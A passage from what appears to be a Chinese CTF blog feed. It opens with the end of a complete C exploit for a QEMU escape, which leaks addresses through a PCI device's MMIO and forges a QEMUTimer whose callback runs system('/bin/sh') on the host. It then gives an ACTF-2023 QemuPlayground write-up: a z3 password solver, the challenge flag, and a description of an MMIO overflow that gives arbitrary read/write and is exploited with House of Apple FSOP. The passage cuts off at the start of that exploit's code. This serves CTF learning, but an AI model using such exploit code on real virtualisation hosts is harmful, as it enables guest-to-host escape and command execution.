class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEX(x) printf(<span class="string">"[*]0x%016llx\n"</span>, (unsigned long long)x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG(addr) printf(<span class="string">"[*]%s\n"</span>, addr)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOWMASK 0xffffffff</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHMASK 0xffffffff00000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// typedef unsigned long long uint64_t;</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> pmio_base = <span class="number">0x000000000000c050</span>;</span><br><span class="line"><span class="type">void</span> * mmio_mem;</span><br><span class="line"><span class="type">char</span>* userbuf;</span><br><span class="line"><span class="type">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Err</span><span class="params">(<span class="type">char</span>* err)</span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error: %s\n"</span>, err);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gfn</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) {</span><br><span class="line">        Err(<span class="string">"open pagemap"</span>);</span><br><span class="line">    }</span><br><span class="line">    offset = ((<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="type">uint64_t</span>)addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">va2pa</span><span class="params">(<span class="type">void</span> *addr)</span>{</span><br><span class="line">    <span class="type">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pagesize = getpagesize();</span><br><span class="line">    <span class="type">size_t</span> offset = ((<span class="type">uintptr_t</span>)addr / pagesize) * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="number">0</span>){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"lseek"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(read(fd,&amp;data,<span class="number">8</span>) != <span class="number">8</span>){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"read"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(data &amp; (((<span class="type">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>)))){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"page"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="type">size_t</span> phyaddr = pageframenum * pagesize + (<span class="type">uintptr_t</span>)addr % pagesize;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span>{</span><br><span class="line">        <span class="keyword">return</span> *(<span class="type">uint64_t</span> *)( mmio_mem + addr );</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">uint64_t</span> val)</span>{</span><br><span class="line">        *(<span class="type">uint64_t</span> *)(mmio_mem + addr) = val;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> val)</span>{</span><br><span class="line">    outl(val,pmio_base+addr);</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_writeb</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint8_t</span> val)</span>{</span><br><span class="line">    outb(val,pmio_base+addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint32_t</span>)inl(pmio_base+addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_readb</span><span class="params">(<span class="type">uint32_t</span> addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint8_t</span>)inb(pmio_base+addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_mmio</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd &lt; <span class="number">0</span>){</span><br><span class="line">        Err(<span class="string">"Open pci"</span>);</span><br><span class="line">    }</span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_mem&lt;<span class="number">0</span>){</span><br><span class="line">        Err(<span class="string">"mmap mmio_mem"</span>);</span><br><span class="line">    }</span><br><span class="line">    LOG(<span class="string">"mmio_init"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_pmio</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        Err(<span class="string">"I/O permission is not enough"</span>);</span><br><span class="line">    LOG(<span class="string">"pmio_init"</span>);</span><br><span class="line">    </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_pa</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">"open"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    LOG(<span class="string">"pa_init"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> {</span></span><br><span class="line">    <span class="type">int64_t</span> expire_time;        <span class="comment">/* in nanoseconds */</span></span><br><span class="line">    <span class="type">void</span>*timer_list;</span><br><span class="line">    <span class="type">void</span>*cb;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    <span class="type">void</span>*next;</span><br><span class="line">    <span class="type">int</span> attributes;</span><br><span class="line">    <span class="type">int</span> scale;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> <span class="title">timer</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    init_mmio();</span><br><span class="line">    init_pa();</span><br><span class="line"></span><br><span class="line"><span class="comment">//泄露地址</span></span><br><span class="line">    mmio_write(<span class="number">0x200</span>,<span class="number">-0x2</span>);</span><br><span class="line">    <span class="type">uint64_t</span> timer_addr = mmio_read(<span class="number">0</span>);</span><br><span class="line">    HEX(timer_addr);</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x200</span>,<span class="number">-0x179</span>);</span><br><span class="line">    <span class="type">uint64_t</span> g_free_plt = mmio_read(<span class="number">0</span>);</span><br><span class="line">    HEX(g_free_plt);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> pie_base = g_free_plt<span class="number">-0x2debd0</span>;</span><br><span class="line">    <span class="type">uint64_t</span> binsh_addr = pie_base + <span class="number">0xA62430</span>;</span><br><span class="line">    <span class="type">uint64_t</span> system_addr = pie_base + <span class="number">0x2DE310</span>;</span><br><span class="line">    HEX(pie_base);</span><br><span class="line">    HEX(system_addr);</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x100</span>,<span class="number">0x30</span>);<span class="comment">//chunk_size</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//伪造timer</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;timer,<span class="number">0</span>,<span class="keyword">sizeof</span>(timer));</span><br><span class="line">    timer.expire_time = <span class="number">0</span>;</span><br><span class="line">    timer.cb = system_addr;</span><br><span class="line">    timer.next = <span class="literal">NULL</span>;</span><br><span class="line">    timer.opaque = binsh_addr;</span><br><span class="line">    timer.scale = <span class="number">1000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">8</span>] = <span class="string">"HanQi.."</span>;</span><br><span class="line">    mmio_write(<span class="number">0x800</span>,<span class="number">1</span>); <span class="comment">//bh_flag = 1</span></span><br><span class="line">    mmio_write(<span class="number">0x700</span>,<span class="number">1</span>); <span class="comment">//bh_rw_flag = 1</span></span><br><span class="line">    mmio_write(<span class="number">0x900</span>,gva_to_gpa(buf)); <span class="comment">//physical</span></span><br><span class="line">    mmio_write(<span class="number">0xF00</span>,<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">//触发mmio_write</span></span><br><span class="line">    mmio_write(<span class="number">0x800</span>,<span class="number">1</span>); <span class="comment">//bh_flag = 1</span></span><br><span class="line">    mmio_write(<span class="number">0x900</span>,<span class="number">0xfebf1000</span>+<span class="number">0xF00</span>); <span class="comment">//physical</span></span><br><span class="line">    mmio_write(<span class="number">0x700</span>,<span class="number">0</span>); <span class="comment">//bh_rw_flag = 0</span></span><br><span class="line">    mmio_write(<span class="number">0x600</span>,<span class="number">1</span>);<span class="comment">//timer_flag = 1</span></span><br><span class="line">    mmio_write(<span class="number">0x400</span>,<span class="number">1</span>);<span class="comment">//free_flag = 1</span></span><br><span class="line">    mmio_write(<span class="number">0x500</span>,<span class="number">1</span>); <span class="comment">//chunk_flag = 1</span></span><br><span class="line">    mmio_write(<span class="number">0xF00</span>,gva_to_gpa(&amp;timer));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312032247696.png"></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Qemu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Qemu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF-2023 QemuPlayground</title>
      <link href="/2023/ACTF-2023%20QemuPlayground/"/>
      <url>/2023/ACTF-2023%20QemuPlayground/</url>
      
        <content type="html"><![CDATA[<p>说再见之前,用Apple交换flag♥</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>去符号表的Qemu逃逸.</p><span id="more"></span><p>使用ida2pat工具从有符号的qemu-x86-64中制作模式文件和签名,导入到IDA中,基本没几个函数能识别的,不知道是工具问题还是库版本问题.</p><p>从已有的idb中导出local_types到头文件中,再导入到IDA中,parse错误,好像是IDA导出的头文件不是标准的C语法格式,不能直接使用.</p><p>只能嗯逆了.</p><p>搜索设备名actf,查看交叉引用,能找到Typeinfo结构体,从而找到class_init和instance_init,进一步找到realize函数.</p><p>标准qemu pwn的realize函数,可以找到mmio、pmio的函数表.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311301436705.png"></p><p>从mmio,pmio的读写函数以及其进一步的调用链可以逆出ACTF设备的关键结构</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ActfState</span><br><span class="line">{</span><br><span class="line"><span class="number">0xA30</span>(<span class="number">1</span>): working</span><br><span class="line"><span class="number">0xA31</span>(<span class="number">1</span>): authentication</span><br><span class="line"><span class="number">0xA34</span><span class="number">-0xA38</span>: key</span><br><span class="line"><span class="number">0xA38</span><span class="number">-0xA78</span> <span class="type">char</span> passwd[<span class="number">0x40</span>]</span><br><span class="line"><span class="number">0xA78</span>(<span class="number">8</span>): buf_ptr</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后大概逻辑是mmio读写密码,pmio在buf上读写(buf_ptr是一个堆指针).但是要先通过密码认证才能使用申请buf.</p><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p>现在是,逆向时间!<br>说实话这种逆向对我来说就是天书,我只喜欢逆结构体和逻辑,和运算有关的别来沾边吧..<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311301907372.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311301907374.png"></p><p>逆完用z3求解.</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">xs = [BitVec(<span class="string">f'x<span class="subst">{i}</span>'</span>,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>)]</span><br><span class="line">v14 = [BitVec(<span class="string">f'z<span class="subst">{i}</span>'</span>,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>)]</span><br><span class="line">v9 = [<span class="number">0x7f</span>, <span class="number">0xac</span>, <span class="number">0x34</span>, <span class="number">0x12</span>] * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">order = xs.copy()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">    s.add(xs[i] &lt;= <span class="number">0x7f</span>)</span><br><span class="line">    s.add(xs[i] &gt;= <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">b''</span>.join(<span class="built_in">map</span>(p64,[<span class="number">0xABA29EC2A98DD89A</span>, <span class="number">0xBBF1B4AB81B4A9D4</span>, <span class="number">0xFB92A48DB386FFA8</span>, <span class="number">0xEFB491B8AFB4ABD3</span>, <span class="number">0x80EF69F1CBD00397</span>, <span class="number">0xB2EB07859CDA52D3</span>, <span class="number">0xEC9E22F5A5A07FA3</span>, <span class="number">0x4B36DF7B5B655A84</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xA</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">        v12 = xs[j] ^ xs[<span class="number">0x20</span>+j]</span><br><span class="line">        v13 = (v9[j] ^ (j+<span class="number">0x11</span>*i))&amp;<span class="number">0xFF</span></span><br><span class="line">        v9[j] = v13</span><br><span class="line">        v14[j] = v13 ^ v12</span><br><span class="line"></span><br><span class="line">    xs[:<span class="number">0x20</span>] = xs[<span class="number">0x20</span>:]</span><br><span class="line">    xs[<span class="number">0x20</span>:] = v14[:<span class="number">0x20</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">    s.add(xs[i] == cipher[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    flag = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> order:</span><br><span class="line">        flag.append(<span class="built_in">int</span>(<span class="string">f'<span class="subst">{m[i]}</span>'</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">''</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> flag))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"no sol"</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>拿到密码(密码是flag的格式是因为这部分还真是一道逆向):</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ACTF{cH3cK_1n_wI7h_B@by_C1ph3r_Te$t_1n_Q3MU_pl4yg3OuNd_1$_EASy!}</span><br></pre></td></tr></tbody></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>mmio_write/mmio_read在读写paasswd时有个4字节的溢出<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311301604896.png"><br>相当于:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> buf[<span class="number">0x10</span>];</span><br><span class="line">buf[<span class="number">0x10</span>] = val;</span><br></pre></td></tr></tbody></table></figure><p>于是可以控制到buf_ptr的低四位.</p><p>动调看一下buf_ptr,发现高位为0x7f45,结合上溢出即可完成0x7f4500000000-0x7f45ffffffff(只是举个例子,有ASLR的)地址范围内的任意读写.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311302337458.png"></p><p>用leakfind搜索一下,找到0x7fce3c000000+0x8a0那一条泄露链,<br>从0x8a0,0x870这俩偏移可以猜到是线程堆的malloc_state.查看最后的libc地址,确实是&amp;main_arena.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312011602760.png"></p><p>fsop打House of Apple,执行”cat flag 1&gt;&amp;2”.<br>(cat flag不行,sh不行,不太懂)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312011602460.png"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span 